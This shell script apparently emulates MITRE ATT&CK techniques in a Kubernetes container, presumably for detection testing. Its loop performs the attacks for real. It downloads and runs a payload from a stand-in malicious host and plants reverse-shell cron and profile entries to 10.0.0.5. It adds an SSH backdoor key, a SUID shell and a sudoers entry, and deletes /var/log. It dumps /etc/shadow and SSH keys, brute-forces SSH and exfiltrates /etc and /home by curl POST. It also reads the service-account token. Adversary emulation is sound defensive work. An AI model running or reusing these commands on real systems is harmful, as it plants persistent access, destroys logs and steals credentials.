#!/usr/bin/env sh

#######################################
# MITRE ATT&CK TTP Simulation Script
# ===================================
# This script simulates adversarial Tactics, Techniques, and Procedures (TTPs) as defined by the MITRE ATT&CK framework.
# It operates across multiple phases of the kill chain, demonstrating how an attacker might infiltrate, persist,
# escalate privileges, evade defenses, and exfiltrate sensitive data in a Kubernetes/containerized environment.

# === Overview of TTP Categories ===
#
# **Initial Access:**
# - Goal: Gain access to the environment.
# - Example: Exploiting public-facing applications, phishing, or social engineering.
# - Simulated TTP: Executes a suspicious shell command to mimic the initial foothold.
#
# **Persistence:**
# - Goal: Maintain access to the compromised system even after detection or disruption.
# - Example: Adding cron jobs, modifying startup scripts, or creating malicious accounts.
# - Simulated TTPs:
#   - Adding a cron job to execute a reverse shell periodically.
#   - Modifying user profile scripts (e.g., `~/.profile`) to execute payloads at login.
#
# **Privilege Escalation:**
# - Goal: Obtain elevated permissions to access restricted resources.
# - Example: Exploiting vulnerabilities or misconfigurations to escalate privileges.
# - Simulated TTP: Adding a malicious user to `/etc/sudoers` with root privileges.
#
# **Defense Evasion:**
# - Goal: Avoid detection by security tools or administrators.
# - Example: Clearing logs, hiding files, or disabling monitoring agents.
# - Simulated TTPs:
#   - Deleting log files from `/var/log` to hinder incident response.
#   - Changing permissions on sensitive files like `/etc/shadow`.
#
# **Credential Access:**
# - Goal: Steal valid credentials to expand access to other systems.
# - Example: Credential dumping, keylogging, or searching for plaintext passwords.
# - Simulated TTPs:
#   - Dumping `/etc/shadow` to access password hashes.
#   - Searching for passwords stored in `.bash_history`.
#
# **Discovery:**
# - Goal: Identify system information, running processes, or network configurations.
# - Example: Running commands like `uname`, `ifconfig`, and `ps` to gather intelligence.
# - Simulated TTPs:
#   - Enumerating system and network configurations.
#   - Listing processes and critical files.
#
# **Lateral Movement:**
# - Goal: Expand foothold to other systems in the environment.
# - Example: Using SSH, RDP, or stolen credentials to move laterally.
# - Simulated TTP: Attempting SSH connections to mimic lateral movement.
#
# **Collection:**
# - Goal: Gather sensitive data for exfiltration.
# - Example: Archiving files or accessing database contents.
# - Simulated TTPs:
#   - Creating tarball archives of sensitive directories.
#   - Exfiltrating `/etc/passwd` over a simulated C2 channel (e.g., `netcat`).
#
# **Impact:**
# - Goal: Disrupt the integrity, availability, or confidentiality of systems or data.
# - Example: Encrypting files, deleting critical directories, or deploying ransomware.
# - Simulated TTPs:
#   - Deleting files in `/tmp` and `/var/tmp`.
#   - Encrypting sensitive files using `openssl`.
#
# **Kubernetes/Container-Specific TTPs:**
# - Focus on the unique attack surface presented by containerized environments.
# - Examples:
#   - Accessing Kubernetes service account tokens.
#   - Enumerating Kubernetes resources using `kubectl`.
#   - Attempting container breakout via host file manipulation.

# === How This Simulation Maps to the Kill Chain ===
#
# 1. **Reconnaissance:** Not directly simulated; assumed initial knowledge of the environment.
# 2. **Weaponization:** Implied by the use of payloads (e.g., reverse shells, scripts).
# 3. **Delivery:** Simulated via suspicious commands, cron jobs, and user profile modifications.
# 4. **Exploitation:** Simulated by credential dumping and privilege escalation attempts.
# 5. **Installation:** Persistence mechanisms like cron jobs and `.profile` payloads.
# 6. **Command and Control (C2):** Simulated via reverse shells and `netcat` connections.
# 7. **Actions on Objectives:** Data exfiltration, discovery, and impact simulations.
#
#######################################

echo "[*] Starting MITRE ATT&CK TTP simulation in container environment..."

#######################################
# Install Dependencies
#######################################
echo "[*] Installing required tools and dependencies..."
apk add --no-cache bash git curl bind-tools mysql-client nc python3 py3-pip gcc musl-dev openssl sshpass nmap docker-cli jq || \
    echo "[!] ERROR: Failed to install dependencies."

# Helper function for randomized sleep intervals
random_sleep() {
    SLEEP_TIME=$((RANDOM % 2 + 1))  # 1-2 seconds delay for faster simulation
    sleep "$SLEEP_TIME"
}

#######################################
# Main Simulation Loop
#######################################
while [ "$ITERATIONS" -eq 0 ] || [ $COUNTER -lt "$ITERATIONS" ]; do
    echo "[*] [CYCLE $COUNTER] Beginning TTP simulation cycle..."

    # === Initial Access / Execution ===
    echo "[+] Simulating Remote Code Execution (RCE)..."
    curl -o /tmp/rce_payload.sh http://malicious.example.com/payload.sh && \
    chmod +x /tmp/rce_payload.sh && /tmp/rce_payload.sh || echo "[!] RCE simulation failed."

    echo "[+] Executing suspicious shell command..."
    bash -c "echo 'Suspicious initial access via bash'" &
    random_sleep

    # === Persistence ===
    echo "[+] Adding malicious cron job..."
    echo "* * * * * root /bin/sh -i >& /dev/tcp/10.0.0.5/4444 0>&1" >> /etc/crontabs/root

    echo "[+] Modifying user profile for persistence..."
    echo "/bin/sh -i >& /dev/tcp/10.0.0.5/5555 0>&1" >> ~/.profile

    echo "[+] Planting SSH backdoor..."
    mkdir -p ~/.ssh && echo "ssh-rsa MALICIOUS_KEY" >> ~/.ssh/authorized_keys
    random_sleep

    # === Privilege Escalation ===
    echo "[+] Simulating privilege escalation using SUID binaries..."
    cp /bin/sh /tmp/suid_sh && chmod +s /tmp/suid_sh && /tmp/suid_sh -p || echo "[!] SUID escalation failed."

    echo "[+] Adding user to sudoers for escalation..."
    echo "eviluser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
    random_sleep

    # === Defense Evasion ===
    echo "[+] Clearing logs and modifying timestamps..."
    rm -rf /var/log/* || echo "[!] Failed to clear logs."
    touch -t 200001010000 /tmp/rce_payload.sh  # Timestomping simulation

    echo "[+] Obfuscating payload with Base64 encoding..."
    echo "echo ZWNobyAiVGhpcyBpcyBhIG1hbGljaW91cyBjb21tYW5kIQ==" | base64 -d | sh &
    random_sleep

    # === Credential Access ===
    echo "[+] Searching for SSH keys..."
    find / -name id_rsa 2>/dev/null | xargs cat || echo "[!] No SSH keys found."

    echo "[+] Simulating brute-force password attack..."
    for i in {1..5}; do sshpass -p "password$i" ssh user@target-machine; done &
    random_sleep

    echo "[+] Dumping credentials from /etc/shadow..."
    cat /etc/shadow || echo "[!] Failed to access /etc/shadow."
    random_sleep

    # === Discovery ===
    echo "[+] Performing system enumeration..."
    uname -a; ip addr show; ps aux; ls -alh /etc

    echo "[+] Scanning for open ports..."
    nmap -T4 -F localhost || echo "[!] Port scan failed."
    random_sleep

    # === Lateral Movement ===
    echo "[+] Attempting lateral movement via SSH..."
    ssh -o StrictHostKeyChecking=no user@target-machine "echo 'Lateral movement attempt'" || echo "[!] SSH attempt failed."
    random_sleep

    echo "[+] Mounting remote NFS share..."
    mount -t nfs 10.0.0.5:/shared /mnt || echo "[!] Failed to mount NFS share."
    random_sleep

    # === Collection & Exfiltration ===
    echo "[+] Archiving and exfiltrating data..."
    tar -czvf collected_data_$COUNTER.tar.gz /etc /home
    curl -X POST -F "file=@collected_data_$COUNTER.tar.gz" http://10.0.0.5/upload || echo "[!] Exfiltration failed."

    echo "[+] Embedding sensitive data into a fake image (steganography simulation)..."
    echo "[*] Simulating steganography. Data hidden in image file."
    random_sleep

    # === Impact ===
    echo "[+] Simulating data destruction..."
    rm -rf /tmp/* /var/tmp/* || echo "[!] Data destruction simulation failed."

    echo "[+] Encrypting sensitive files..."
    openssl enc -aes-256-cbc -salt -in collected_data_$COUNTER.tar.gz -out encrypted_$COUNTER.enc -k supersecret
    random_sleep

    # === Kubernetes/Container-Specific ===
    echo "[+] Accessing Kubernetes secrets and service tokens..."
    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "[!] No Kubernetes tokens found."

    echo "[+] Deploying malicious pod into the cluster..."
    kubectl run malicious-pod --image=alpine -- sh -c "while true; do echo 'Malicious pod running'; sleep 10; done" || echo "[!] Failed to deploy pod."

    echo "[+] Attempting container breakout..."
    if [ -d "/host" ]; then
        echo "Breakout attempt" >> /host/etc/hosts || echo "[!] Breakout failed."
    else
        echo "[!] No host path mount found."
    fi
    random_sleep

    # === End of Cycle ===
    echo "[*] [CYCLE $COUNTER] Completed TTP simulation cycle."
    COUNTER=$((COUNTER + 1))
    [ "$ITERATIONS" -ne 0 ] && [ $COUNTER -ge "$ITERATIONS" ] && break

    SLEEP_BETWEEN=$((RANDOM % 5 + 3))
    echo "[*] Sleeping for ${SLEEP_BETWEEN}s before next cycle..."
    sleep "$SLEEP_BETWEEN"
done

echo "[*] MITRE ATT&CK TTP simulation completed."